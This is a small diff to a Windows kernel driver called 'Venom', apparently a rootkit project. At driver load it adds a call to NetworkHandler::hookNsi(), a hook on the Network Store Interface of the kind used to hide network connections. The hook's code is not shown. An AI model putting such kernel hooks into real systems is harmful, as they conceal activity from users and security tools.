@@ -1,6 +1,7 @@
 #include "Venom.h"
 #include "IoctlHandlers.h"
 #include "Ioctl.h"
+#include "NetworkHandler.h"
 
 // Prototypes
 void VenomUnload(PDRIVER_OBJECT DriverObject);
@@ -44,6 +45,11 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	DriverObject->DriverUnload = VenomUnload;
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;
+
+	status = NetworkHandler::hookNsi();
+	if (!NT_SUCCESS(status)) {
+		return status;
+	}
 
 	return STATUS_SUCCESS;
 }
